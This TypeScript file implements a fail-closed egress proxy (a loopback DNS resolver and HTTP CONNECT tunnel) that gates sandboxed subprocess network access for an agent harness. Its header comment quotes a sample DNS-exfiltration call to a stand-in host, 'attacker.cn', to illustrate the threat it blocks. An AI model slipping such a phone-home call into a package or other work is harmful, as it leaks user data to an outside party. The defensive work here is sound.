// Copyright (c) 2026 TechLead 187 LLC
// SPDX-License-Identifier: BUSL-1.1

// harness/runs/egress_proxy.ts — P-SANDBOX.2 (ADR-0166): the mediated subprocess-egress proxy.
//
// P-SANDBOX.1 made the DECLARED `canNetwork` cap real for the DOWNGRADE profiles: a
// suspicious/quarantined chain gets `--unshare-net` — total network deny, the DNS-TXT exfil dies at
// the syscall. But the COMMON case (`trusted-local`, `canNetwork:true`) still ran with raw, unmediated
// network, so a benign-looking `pip install` whose package does `socket.gethostbyname("<b64>.attacker.cn")`
// at import time could still phone home (ADR-0157's named threat, Thom E.'s review). Cutting the network
// entirely there would break `pip install` and every legitimate reach-out.
//
// This module is the middle path: for `canNetwork:true` the sandbox's only route out is a LOOPBACK
// DNS resolver + HTTP CONNECT proxy that the harness runs. Every DNS query and every CONNECT is decided
// by the EXACT SAME brain the agent's own browser/web tools already use — `egressDecisionDetailed`
// (ADR-0062/0106/0108) — so subprocess egress obeys the SAME curated whitelist (P-NETWL), managed
// ceiling (P-ENT.1), and posture (P-NETWL.5) the user already curates. `gethostbyname` on a TXT record
// is now a resolver event we SEE, LOG, and can REFUSE.
//
// FAIL-CLOSED (invariant #3): a subprocess libc call cannot be interactively approved mid-syscall, so
// ONLY an explicit `allow` verdict passes. Everything else — a `prompt` verdict (a foreign ccTLD or a
// public-IP literal under P-NETWL.5's still-prompt heuristics), an unparseable host, or a THROWN
// decision — is DENIED and logged. There is no code path where "cannot decide" becomes "resolve".
//
// REUSE, never re-derive (invariant): the decision function is `egressDecisionDetailed`, imported. The
// still-prompt heuristics (`isForeignTld`/`isPrivateOrLanHost`/IP-literal) already live inside it, so
// mapping `prompt → deny` here EXTENDS them to subprocess DNS for free.
//
// Scope note (honest, recorded in ADR-0166): the proxy + its decision engine + the sandbox_exec
// plumbing (resolv.conf bind + HTTP(S)_PROXY env) land here and are verified at the loopback level on
// every OS. Binding a privileged in-namespace :53 and funnelling RAW-IP sockets that ignore HTTP_PROXY
// (slirp4netns-style) is P-SANDBOX.4 — until then a raw-IP socket is DROPPED by `--unshare-net`, not
// forwarded. New EventName emission (`dns_query_blocked` etc.) is quarantined to P-SANDBOX.3 (inv #8);
// here we keep an in-memory, observable event log and reuse existing block plumbing.

import { createSocket, type Socket as UdpSocket } from "node:dgram";
import { connect as tcpConnect, createServer as createTcpServer, type Server as TcpServer, type Socket as TcpSocket } from "node:net";
import { getServers } from "node:dns";
import { mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { egressDecisionDetailed, type EgressContext } from "../../desktop/egress_policy.ts";

export type EgressAction = "allow" | "deny";

/** The reason a subprocess reach-out was allowed or denied — the greppable audit string. */
export interface EgressProxyDecision {
  action: EgressAction;
  /** The (normalized) host we decided on. */
  host: string;
  /** Machine-stable reason: "allowed" | "prompt-not-auto-allowed" | "unparseable-host" | "decision-error". */
  reason: string;
  /** How the underlying brain decided: "whitelist" | "allow-all" | "host" | "fail-closed". */
  via: string;
}

/** One mediated reach-out, kept in an in-memory ring so tests/demos (and, in P-SANDBOX.3, the Security
 *  panel) can observe what the proxy saw. `channel` distinguishes a DNS query from a CONNECT tunnel. */
export interface ProxyEvent {
  channel: "dns" | "connect";
  decision: EgressProxyDecision;
}

/** The pluggable decision brain. Returns the RAW verdict (allow/prompt) + how it was reached. Injectable
 *  so tests are hermetic; the default reuses `egressDecisionDetailed` — the agent's own egress brain. */
export type DecideFn = (host: string, ctx?: EgressContext) => { verdict: "allow" | "prompt"; via: string };

/** Default brain: ask the exact same `egressDecisionDetailed` the browser/web tools use. IPv6 literals are
 *  bracketed so the URL parses; everything else rides through unchanged (inv: reuse, never re-derive). */
export const defaultDecide: DecideFn = (host, ctx) => {
  const url = host.includes(":") && !host.startsWith("[") ? `https://[${host}]/` : `https://${host}/`;
  const d = egressDecisionDetailed(url, ctx);
  return { verdict: d.verdict, via: d.via };
};

/** Normalize a DNS QNAME or a CONNECT `host[:port]` target to a bare host: lowercased, port stripped,
 *  IPv6 unbracketed, trailing dot dropped. Returns "" for anything with whitespace/slashes or empty —
 *  which the caller MUST treat as a deny (fail-closed). Pure. */
export function normalizeHost(raw: string): string {
  let h = String(raw ?? "").trim().toLowerCase();
  if (!h) return "";
  const v6 = /^\[([0-9a-f:]+)\](?::\d+)?$/i.exec(h); // [::1] or [2001:db8::1]:443
  if (v6) return v6[1]!;
  const hp = /^([^:/\s]+):\d+$/.exec(h); // host:port (IPv4 / name)
  if (hp) h = hp[1]!;
  h = h.replace(/\.$/, ""); // a fully-qualified QNAME ends in a root dot
  if (!h || /[\s/\\]/.test(h) || /[\x00-\x1f\x7f]/.test(h)) return ""; // whitespace / path / control char ⇒ unparseable
  return h;
}

/**
 * The security keystone, PURE: decide a single subprocess reach-out to `host`. Only an explicit `allow`
 * verdict passes; a `prompt` (foreign ccTLD / public-IP literal / not-yet-approved host), an unparseable
 * host, or a decision that THROWS all deny. Over-tested (this is the gate the DNS-TXT exfil hits).
 */
export function decideEgress(host: string, decide: DecideFn = defaultDecide, ctx?: EgressContext): EgressProxyDecision {
  const h = normalizeHost(host);
  if (!h) return { action: "deny", host: String(host ?? "").trim(), reason: "unparseable-host", via: "fail-closed" };
  let d: { verdict: "allow" | "prompt"; via: string };
  try {
    d = decide(h, ctx);
  } catch {
    return { action: "deny", host: h, reason: "decision-error", via: "fail-closed" };
  }
  if (d.verdict === "allow") return { action: "allow", host: h, reason: "allowed", via: d.via };
  return { action: "deny", host: h, reason: "prompt-not-auto-allowed", via: d.via };
}

// ── DNS wire format (RFC 1035) — just enough to read the QNAME and craft a REFUSED reply ───────────────

/** Extract the queried domain from a DNS query packet. Tolerant: malformed / truncated → "" (⇒ deny).
 *  We read only the first question's QNAME (offset 12), which is all we gate on. Pure. */
export function parseDnsQuestion(buf: Uint8Array): string {
  if (buf.length < 13) return "";
  const labels: string[] = [];
  let i = 12; // skip the 12-byte header
  let guard = 0;
  while (i < buf.length && guard++ < 128) {
    const len = buf[i]!;
    if (len === 0) return labels.join(".");
    if (len & 0xc0) return ""; // a compression pointer in a QNAME is malformed for a query — refuse
    i += 1;
    if (i + len > buf.length) return "";
    let label = "";
    for (let j = 0; j < len; j++) label += String.fromCharCode(buf[i + j]!);
    labels.push(label);
    i += len;
  }
  return "";
}

/** Build a REFUSED (RCODE 5) response that echoes the query's header + question and carries no answers.
 *  A denied `gethostbyname` therefore fails to resolve — the exfil channel is dead — and the failure is
 *  a clean DNS error the child sees, not a hang. Pure. */
export function buildRefusal(query: Uint8Array): Uint8Array {
  const out = Uint8Array.from(query);
  if (out.length < 12) return out;
  out[2] = (out[2]! & 0x01) | 0x80; // QR=1, preserve RD, clear opcode/AA/TC
  out[3] = 0x05; // RA=0, Z=0, RCODE=5 (REFUSED)
  out[6] = 0; out[7] = 0; // ANCOUNT = 0
  out[8] = 0; out[9] = 0; // NSCOUNT = 0
  out[10] = 0; out[11] = 0; // ARCOUNT = 0
  return out;
}

// ── the proxy: a loopback DNS resolver + HTTP CONNECT listener, both decision-gated ────────────────────

/** What a started proxy exposes to the sandbox wiring. `resolvConfPath` is a generated `resolv.conf`
 *  bound over the child's /etc/resolv.conf so its stub resolver targets us; `httpProxyUrl` is set as
 *  HTTP(S)_PROXY so libcurl/requests/pip tunnel through us. */
export interface EgressProxyEndpoint {
  host: string;
  dnsPort: number;
  httpPort: number;
  resolvConfPath: string;
  httpProxyUrl: string;
}

export interface EgressProxyOpts {
  decide?: DecideFn;
  ctx?: EgressContext;
  /** Upstream DNS resolver for ALLOWED queries (injectable for tests). Defaults to the system resolver. */
  upstream?: { host: string; port: number };
  /** Cap on the in-memory event ring (oldest dropped). */
  maxEvents?: number;
  onEvent?: (e: ProxyEvent) => void;
}

const LOOPBACK = "127.0.0.1";

export class EgressProxy {
  readonly events: ProxyEvent[] = [];
  private readonly decide: DecideFn;
  private readonly ctx?: EgressContext;
  private readonly upstream: { host: string; port: number };
  private readonly maxEvents: number;
  private readonly onEvent?: (e: ProxyEvent) => void;
  private dns?: UdpSocket;
  private http?: TcpServer;
  private live = false;
  private ep: EgressProxyEndpoint | null = null;
  private readonly sockets = new Set<TcpSocket>();

  constructor(opts: EgressProxyOpts = {}) {
    this.decide = opts.decide ?? defaultDecide;
    this.ctx = opts.ctx;
    const sys = safeSystemResolver();
    this.upstream = opts.upstream ?? { host: sys, port: 53 };
    this.maxEvents = opts.maxEvents ?? 500;
    this.onEvent = opts.onEvent;
  }

  running(): boolean {
    return this.live;
  }
  endpoint(): EgressProxyEndpoint | null {
    return this.ep;
  }

  /** PURE-ish helper (the decision is pure; the logging is the side effect): decide + record one host. */
  decideHost(host: string, channel: "dns" | "connect"): EgressProxyDecision {
    const decision = decideEgress(host, this.decide, this.ctx);
    const event: ProxyEvent = { channel, decision };
    this.events.push(event);
    if (this.events.length > this.maxEvents) this.events.shift();
    try {
      this.onEvent?.(event);
    } catch {
      /* an observer must never break mediation */
    }
    return decision;
  }

  /** Bring up both listeners on loopback and write the generated resolv.conf. Idempotent: a second call
   *  returns the existing endpoint. `dnsPort`/`httpPort` default to ephemeral (tests); the live spawn
   *  wiring requests fixed ports. */
  async start(o: { host?: string; dnsPort?: number; httpPort?: number } = {}): Promise<EgressProxyEndpoint> {
    if (this.live && this.ep) return this.ep;
    const host = o.host ?? LOOPBACK;
    const dnsPort = await this.startDns(host, o.dnsPort ?? 0);
    const httpPort = await this.startHttp(host, o.httpPort ?? 0);
    const dir = mkdtempSync(join(tmpdir(), "lucid-egress-"));
    const resolvConfPath = join(dir, "resolv.conf");
    // A stub resolver reads only `nameserver`; the port is implied :53 in-namespace (P-SANDBOX.4 binds it).
    writeFileSync(resolvConfPath, `# LUCID mediated egress (P-SANDBOX.2, ADR-0166)\nnameserver ${host}\noptions timeout:2 attempts:1\n`, "utf8");
    this.live = true;
    this.ep = { host, dnsPort, httpPort, resolvConfPath, httpProxyUrl: `http://${host}:${httpPort}` };
    return this.ep;
  }

  /** Tear both listeners down and drop any in-flight tunnels. After stop(), the endpoint is gone and a
   *  child steered here can no longer resolve/connect — the fail-closed "proxy dead ⇒ egress denied". */
  async stop(): Promise<void> {
    this.live = false;
    this.ep = null;
    for (const s of this.sockets) {
      try {
        s.destroy();
      } catch {
        /* best effort */
      }
    }
    this.sockets.clear();
    await new Promise<void>((res) => (this.dns ? this.dns.close(() => res()) : res()));
    await new Promise<void>((res) => (this.http ? this.http.close(() => res()) : res()));
    this.dns = undefined;
    this.http = undefined;
  }

  /** Bind the DNS listener. Tries the requested port (the live wiring asks for a privileged :53 so a
   *  bound resolv.conf can point at us) and, if that bind fails (EACCES on an unprivileged host, or the
   *  port is taken), FALLS BACK to an ephemeral port instead of failing the whole proxy. The caller reads
   *  the returned port: a non-:53 result means it must NOT bind resolv.conf (DNS stays with the host
   *  resolver; HTTP(S) is still mediated). This keeps the proxy always-up and never bricks networking. */
  private async startDns(host: string, port: number): Promise<number> {
    try {
      return await this.bindDns(host, port);
    } catch {
      if (port === 0) throw new Error("could not bind the mediated DNS listener on an ephemeral port");
      return this.bindDns(host, 0); // graceful degrade: ephemeral (⇒ caller skips the resolv.conf bind)
    }
  }

  private bindDns(host: string, port: number): Promise<number> {
    return new Promise((resolve, reject) => {
      const sock = createSocket("udp4");
      const onErr = (e: unknown) => {
        sock.removeAllListeners();
        try {
          sock.close();
        } catch {
          /* ignore */
        }
        reject(e);
      };
      sock.once("error", onErr);
      sock.bind(port, host, () => {
        sock.removeListener("error", onErr);
        sock.on("error", () => {
          /* a per-datagram error must not tear the listener down */
        });
        sock.on("message", (msg, rinfo) => this.onDnsQuery(sock, msg, rinfo.port, rinfo.address));
        this.dns = sock;
        resolve(sock.address().port);
      });
    });
  }

  private onDnsQuery(sock: UdpSocket, msg: Buffer, port: number, address: string): void {
    const qname = parseDnsQuestion(msg);
    const decision = this.decideHost(qname || "", "dns");
    if (decision.action === "deny") {
      try {
        sock.send(buildRefusal(msg), port, address); // REFUSED — never touches the upstream
      } catch {
        /* the child sees no reply ⇒ still fails closed */
      }
      return;
    }
    // Allowed: forward the raw query to the upstream resolver and relay its answer back verbatim.
    const relay = createSocket("udp4");
    let done = false;
    const finish = () => {
      if (done) return;
      done = true;
      try {
        relay.close();
      } catch {
        /* ignore */
      }
    };
    const timer = setTimeout(() => {
      // Upstream did not answer in time — send REFUSED rather than hang (fail-closed on the timeout too).
      try {
        sock.send(buildRefusal(msg), port, address);
      } catch {
        /* ignore */
      }
      finish();
    }, 4000);
    relay.on("error", () => {
      clearTimeout(timer);
      try {
        sock.send(buildRefusal(msg), port, address);
      } catch {
        /* ignore */
      }
      finish();
    });
    relay.on("message", (answer) => {
      clearTimeout(timer);
      try {
        sock.send(answer, port, address);
      } catch {
        /* ignore */
      }
      finish();
    });
    try {
      relay.send(msg, this.upstream.port, this.upstream.host);
    } catch {
      clearTimeout(timer);
      try {
        sock.send(buildRefusal(msg), port, address);
      } catch {
        /* ignore */
      }
      finish();
    }
  }

  private startHttp(host: string, port: number): Promise<number> {
    return new Promise((resolve, reject) => {
      const server = createTcpServer((client) => this.onHttpClient(client));
      server.on("error", reject);
      server.listen(port, host, () => {
        this.http = server;
        const addr = server.address();
        resolve(typeof addr === "object" && addr ? addr.port : port);
      });
    });
  }

  private onHttpClient(client: TcpSocket): void {
    this.sockets.add(client);
    client.once("close", () => this.sockets.delete(client));
    client.on("error", () => client.destroy());
    client.once("data", (chunk) => {
      const head = chunk.toString("latin1");
      const line = head.split("\r\n", 1)[0] ?? "";
      const m = /^CONNECT\s+(\S+)\s+HTTP\/1\.[01]/i.exec(line);
      if (!m) {
        // Plain-HTTP proxying (absolute-URI GET) is not tunnelled in v1 — deny explicitly (fail-closed).
        this.decideHost(hostFromAbsoluteUri(line), "connect");
        client.end("HTTP/1.1 405 Method Not Allowed\r\nConnection: close\r\n\r\nLUCID egress proxy: only CONNECT tunnels are mediated (ADR-0166).\r\n");
        return;
      }
      const target = m[1]!;
      const decision = this.decideHost(target, "connect");
      if (decision.action === "deny") {
        client.end(`HTTP/1.1 403 Forbidden\r\nConnection: close\r\n\r\nLUCID egress proxy: ${decision.host} denied (${decision.reason}).\r\n`);
        return;
      }
      this.tunnel(client, target);
    });
  }

  private tunnel(client: TcpSocket, target: string): void {
    const host = normalizeHost(target);
    const portMatch = /:(\d+)$/.exec(target);
    const port = portMatch ? Number(portMatch[1]) : 443;
    const upstream = tcpConnect({ host, port }, () => {
      client.write("HTTP/1.1 200 Connection Established\r\nConnection: close\r\n\r\n");
      client.pipe(upstream);
      upstream.pipe(client);
    });
    this.sockets.add(upstream);
    upstream.once("close", () => this.sockets.delete(upstream));
    upstream.on("error", () => {
      try {
        client.end("HTTP/1.1 502 Bad Gateway\r\nConnection: close\r\n\r\n");
      } catch {
        /* ignore */
      }
      upstream.destroy();
    });
  }
}

/** First system DNS server, or a safe public fallback. Never throws — a bad resolver list must not stop
 *  the proxy from coming up (a denied query never reaches the upstream anyway). */
function safeSystemResolver(): string {
  try {
    const s = getServers().filter((x) => x && !x.startsWith("fe80"));
    return s[0] ?? "1.1.1.1";
  } catch {
    return "1.1.1.1";
  }
}

/** Best-effort host from an absolute-URI request line (`GET http://host/path HTTP/1.1`) so the deny is
 *  still logged with the intended host. Returns "" when it can't parse (⇒ deny). Pure. */
export function hostFromAbsoluteUri(line: string): string {
  const m = /^\S+\s+([a-z]+:\/\/[^/\s]+)/i.exec(line);
  if (!m) return "";
  try {
    return new URL(m[1]!).hostname;
  } catch {
    return "";
  }
}

// ── shared singleton for the live spawn wiring ─────────────────────────────────────────────────────────
let shared: EgressProxy | null = null;

/** Lazily start (once) a process-wide mediated-egress proxy for the live omp spawn. Returns the running
 *  endpoint, or null if it could not come up — in which case the sandbox wiring FALLS BACK to network-off
 *  (`--unshare-net`), never to raw unmediated network (fail-closed, invariant #3). Callers gate this on an
 *  ISOLATING backend + `canNetwork:true`; on a passthrough there is nothing to steer, so they skip it. */
export async function ensureEgressProxy(o: { host?: string; dnsPort?: number; httpPort?: number } = {}): Promise<EgressProxyEndpoint | null> {
  try {
    if (!shared) shared = new EgressProxy();
    if (shared.running()) return shared.endpoint();
    return await shared.start(o);
  } catch {
    shared = null;
    return null;
  }
}

/** Stop + clear the shared proxy (used by shutdown paths and tests). */
export async function stopEgressProxy(): Promise<void> {
  if (shared) {
    await shared.stop();
    shared = null;
  }
}
